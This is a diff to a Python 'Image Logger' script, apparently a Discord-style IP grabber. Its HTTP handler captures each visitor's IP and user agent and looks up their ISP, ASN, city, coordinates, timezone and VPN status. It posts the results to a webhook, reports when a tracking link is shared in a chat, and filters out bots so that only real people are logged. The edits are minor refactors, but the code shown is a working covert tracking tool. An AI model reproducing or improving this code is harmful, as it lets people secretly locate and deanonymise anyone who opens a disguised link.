@@ -40,8 +40,7 @@ def botCheck(ip, useragent):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
-    else:
-        return False
+    return False
 
 def reportError(error):
     requests.post(config["webhook"], json={
@@ -54,7 +53,7 @@ def reportError(error):
         }]
     })
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image_url=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if ip.startswith(blacklistedIPs):
         return
 
@@ -68,7 +67,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
                     "title": "Image Logger - Link Sent",
                     "color": config["color"],
                     "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
-                    "image": {"url": image_url or config["image"]}
+                    "image": {"url": config["image"]}
                 }]
             })
         return
@@ -87,7 +86,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
             ping = ""
 
     if info.get("hosting"):
-        if config["antiBot"] in [3, 4] and not info.get("proxy"):
+        if config["antiBot"] in [3,4] and not info.get("proxy"):
             return
         if config["antiBot"] == 2 and not info.get("proxy"):
             ping = ""
@@ -108,16 +107,16 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
 
 **IP Info:**
 > **IP:** `{ip}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
-> **ASN:** `{info.get('as', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
+> **Provider:** `{info.get('isp','Unknown')}`
+> **ASN:** `{info.get('as','Unknown')}`
+> **Country:** `{info.get('country','Unknown')}`
+> **Region:** `{info.get('regionName','Unknown')}`
+> **City:** `{info.get('city','Unknown')}`
 > **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}`
-> **Timezone:** `{info.get('timezone', 'Unknown')}`
+> **Timezone:** `{info.get('timezone','Unknown')}`
 > **Mobile:** `{info.get('mobile', False)}`
 > **VPN:** `{info.get('proxy', False)}`
-> **Bot:** {"Possibly" if info.get('hosting', False) else "False"}
+> **Bot:** {"Possibly" if info.get('hosting') else "False"}
 
 **PC Info:**
 > **OS:** `{os_name}`
@@ -126,7 +125,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
 **User Agent:**
 {useragent}
 """,
-            "image": {"url": image_url or config["image"]}
+            "image": {"url": config["image"]}
         }]
     }
 
@@ -141,7 +140,7 @@ class Handler(BaseHTTPRequestHandler):
 
             user_ip = self.client_address[0]
             user_agent = self.headers.get('User-Agent', 'Unknown')
-            makeReport(user_ip, user_agent, endpoint=self.path, url=True, image_url=img_url)
+            makeReport(user_ip, user_agent, endpoint=self.path, url=True)
 
             if config["redirect"]["redirect"]:
                 self.send_response(302)
